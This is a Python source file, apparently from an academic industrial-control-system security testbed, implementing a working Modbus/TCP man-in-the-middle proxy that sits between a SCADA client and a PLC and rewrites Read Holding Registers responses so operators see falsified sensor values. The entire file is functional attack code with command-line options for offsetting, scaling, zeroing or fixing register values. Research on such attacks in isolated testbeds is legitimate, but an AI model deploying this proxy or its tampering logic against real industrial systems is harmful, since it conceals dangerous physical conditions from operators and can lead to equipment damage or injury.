#!/usr/bin/env python3
"""
ASCEND-PG attacks/mitm_proxy.py

Man-in-the-Middle transparent TCP proxy (MITRE ATT&CK for ICS: T0830 —
Man in the Middle).

Architecture (inspired by the modpwn framework):
  - Binds a proxy server on a configurable port (default 503)
  - For each incoming connection, opens a matching connection to the
    real PLC (target, default port 502)
  - Forwards all client → PLC requests unchanged
  - Intercepts FC03 (Read Holding Registers) RESPONSES from PLC → client
    and modifies the register values before forwarding
  - All other traffic passes through unmodified

This proxy is transparent to the SCADA client — it sees what appears
to be a normal PLC, but the sensor values it receives are tampered.
This is the canonical ICS MITM: the operator sees a healthy process
while the physical state may be deteriorating.

The SCADA client must be pointed at the proxy (port 503) instead of
directly at the PLC (port 502). In the Mininet testbed, this means
either reconfiguring the SCADA client's target or using iptables to
redirect traffic.

Run this ON THE ATTACKER HOST inside the Mininet topology:
    python3 attacks/mitm_proxy.py --target 10.0.0.1

ACADEMIC USE ONLY — isolated testbed, no production systems.
"""

import argparse
import json
import socket
import struct
import threading
import time
from datetime import datetime, timezone
from pathlib import Path

DEFAULT_LOG = Path(__file__).resolve().parent.parent / "data" / "log_store.json"

MODBUS_PORT = 502
PROXY_PORT = 503
DEFAULT_DURATION = 60

# Modbus function code for Read Holding Registers response
FC03_READ_HOLDING = 0x03


def log_event(log_path: Path, event: dict):
    """Append one event to the shared JSON log store (JSONL format)."""
    event["timestamp"] = datetime.now(timezone.utc).isoformat()
    log_path.parent.mkdir(parents=True, exist_ok=True)
    with open(log_path, "a", encoding="utf-8") as f:
        f.write(json.dumps(event) + "\n")


def parse_mbap_header(data: bytes):
    """Parse the 7-byte Modbus/TCP MBAP header.

    Returns (transaction_id, protocol_id, length, unit_id) or None if
    the data is too short or doesn't look like Modbus.
    """
    if len(data) < 7:
        return None
    tx_id, proto_id, length, unit_id = struct.unpack(">HHHB", data[:7])
    if proto_id != 0:  # Not Modbus protocol
        return None
    return tx_id, proto_id, length, unit_id


def modify_fc03_response(data: bytes, mode: str, magnitude: float) -> bytes:
    """Modify register values in an FC03 Read Holding Registers response.

    Frame layout after MBAP header (7 bytes):
      function_code (1 byte, 0x03) + byte_count (1 byte) + register_data

    Each register is 2 bytes, big-endian unsigned (0–65535).
    """
    header = parse_mbap_header(data)
    if header is None:
        return data

    tx_id, proto_id, length, unit_id = header

    # Check this is an FC03 response (not an error response 0x83)
    if len(data) < 9:
        return data
    fc = data[7]
    if fc != FC03_READ_HOLDING:
        return data

    byte_count = data[8]
    register_start = 9
    register_end = register_start + byte_count

    if len(data) < register_end:
        return data

    # Extract register values
    num_registers = byte_count // 2
    registers = []
    for i in range(num_registers):
        offset = register_start + (i * 2)
        val = struct.unpack(">H", data[offset:offset + 2])[0]
        registers.append(val)

    # Apply modification
    modified = []
    for val in registers:
        if mode == "offset":
            new_val = int(val + magnitude)
        elif mode == "scale":
            new_val = int(val * magnitude)
        elif mode == "zero":
            new_val = 0
        elif mode == "fixed":
            new_val = int(magnitude)
        else:
            new_val = val

        # Clamp to valid Modbus register range
        new_val = max(0, min(65535, new_val))
        modified.append(new_val)

    # Rebuild the register data
    new_data = bytearray(data)
    for i, val in enumerate(modified):
        offset = register_start + (i * 2)
        struct.pack_into(">H", new_data, offset, val)

    return bytes(new_data)


def relay_thread(src: socket.socket, dst: socket.socket, name: str,
                 modify: bool, mode: str, magnitude: float,
                 log_path: Path, stats: dict, stop_event: threading.Event):
    """Relay data from src to dst, optionally modifying FC03 responses."""
    try:
        while not stop_event.is_set():
            src.settimeout(1.0)
            try:
                data = src.recv(4096)
            except socket.timeout:
                continue
            if not data:
                break

            if modify:
                header = parse_mbap_header(data)
                if header and len(data) > 7 and data[7] == FC03_READ_HOLDING:
                    original = data
                    data = modify_fc03_response(data, mode, magnitude)
                    if data != original:
                        stats["modified"] += 1
                        if stats["modified"] <= 10:
                            log_event(log_path, {
                                "stage": "attack", "technique": "T0830",
                                "action": "mitm_intercept",
                                "direction": name,
                                "registers_modified": True,
                                "mode": mode,
                                "magnitude": magnitude,
                            })

            try:
                dst.sendall(data)
                stats["relayed"] += 1
            except (socket.timeout, OSError):
                break
    except (socket.timeout, OSError):
        pass
    finally:
        try:
            src.close()
        except OSError:
            pass
        try:
            dst.close()
        except OSError:
            pass


def run_proxy(listen_ip: str, listen_port: int, target_ip: str,
              target_port: int, mode: str, magnitude: float,
              duration: float, log_path: Path) -> dict:
    """Run the MITM proxy for the specified duration."""

    stats = {"connections": 0, "relayed": 0, "modified": 0}
    stop_event = threading.Event()
    threads = []

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.settimeout(1.0)
    server.bind((listen_ip, listen_port))
    server.listen(5)

    print(f"[mitm] Proxy listening on {listen_ip}:{listen_port}")
    print(f"[mitm] Forwarding to PLC at {target_ip}:{target_port}")
    print(f"[mitm] Mode: {mode}, magnitude: {magnitude}")
    print(f"[mitm] Running for {duration}s ...")

    end_time = time.time() + duration

    try:
        while time.time() < end_time and not stop_event.is_set():
            try:
                client_sock, client_addr = server.accept()
            except socket.timeout:
                continue

            stats["connections"] += 1
            print(f"[mitm] Client connected from {client_addr}")

            # Connect to the real PLC
            try:
                plc_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                plc_sock.settimeout(5)
                plc_sock.connect((target_ip, target_port))
            except (socket.timeout, OSError) as exc:
                print(f"[mitm] Cannot reach PLC {target_ip}:{target_port}: "
                      f"{exc}")
                client_sock.close()
                continue

            # Client → PLC: forward requests unchanged
            t1 = threading.Thread(
                target=relay_thread,
                args=(client_sock, plc_sock, "client→PLC", False,
                      mode, magnitude, log_path, stats, stop_event),
                daemon=True)

            # PLC → Client: intercept and modify FC03 responses
            t2 = threading.Thread(
                target=relay_thread,
                args=(plc_sock, client_sock, "PLC→client", True,
                      mode, magnitude, log_path, stats, stop_event),
                daemon=True)

            t1.start()
            t2.start()
            threads.extend([t1, t2])

    except KeyboardInterrupt:
        print("[mitm] Interrupted — shutting down proxy")
    finally:
        stop_event.set()
        server.close()

        # Wait for relay threads to finish
        for t in threads:
            t.join(timeout=2)

    return stats


def main():
    parser = argparse.ArgumentParser(
        description="ASCEND-PG MITM Proxy (T0830) — intercepts and modifies "
                    "Modbus responses")
    parser.add_argument("--target", required=True,
                        help="Real PLC IP to proxy to")
    parser.add_argument("--target-port", type=int, default=MODBUS_PORT,
                        help=f"Real PLC Modbus port (default: {MODBUS_PORT})")
    parser.add_argument("--listen-port", type=int, default=PROXY_PORT,
                        help=f"Proxy listen port (default: {PROXY_PORT})")
    parser.add_argument("--listen-ip", default="0.0.0.0",
                        help="Proxy listen IP (default: 0.0.0.0)")
    parser.add_argument("--mode", choices=["offset", "scale", "zero", "fixed"],
                        default="offset",
                        help="Response modification mode (default: offset)")
    parser.add_argument("--magnitude", type=float, default=100,
                        help="Offset/scale/fixed value (default: 100)")
    parser.add_argument("--duration", type=float, default=DEFAULT_DURATION,
                        help=f"How long to run the proxy in seconds "
                             f"(default: {DEFAULT_DURATION})")
    parser.add_argument("--log", default=str(DEFAULT_LOG),
                        help="Path to the shared event log store")
    args = parser.parse_args()

    log_path = Path(args.log)
    log_path.parent.mkdir(parents=True, exist_ok=True)

    log_event(log_path, {
        "stage": "attack", "technique": "T0830",
        "action": "mitm_start", "target": args.target,
        "listen": f"{args.listen_ip}:{args.listen_port}",
        "mode": args.mode, "magnitude": args.magnitude,
        "duration": args.duration,
    })

    try:
        stats = run_proxy(args.listen_ip, args.listen_port,
                          args.target, args.target_port,
                          args.mode, args.magnitude,
                          args.duration, log_path)
    except Exception as exc:
        log_event(log_path, {
            "stage": "attack", "technique": "T0830",
            "action": "mitm_error", "error": str(exc),
        })
        print(f"[mitm] FAILED: {exc}")
        raise

    log_event(log_path, {
        "stage": "attack", "technique": "T0830",
        "action": "mitm_stop",
        "connections": stats["connections"],
        "relayed": stats["relayed"],
        "modified": stats["modified"],
    })
    print(f"[mitm] Done — {stats['connections']} connections handled, "
          f"{stats['relayed']} frames relayed, "
          f"{stats['modified']} FC03 responses modified")


if __name__ == "__main__":
    main()
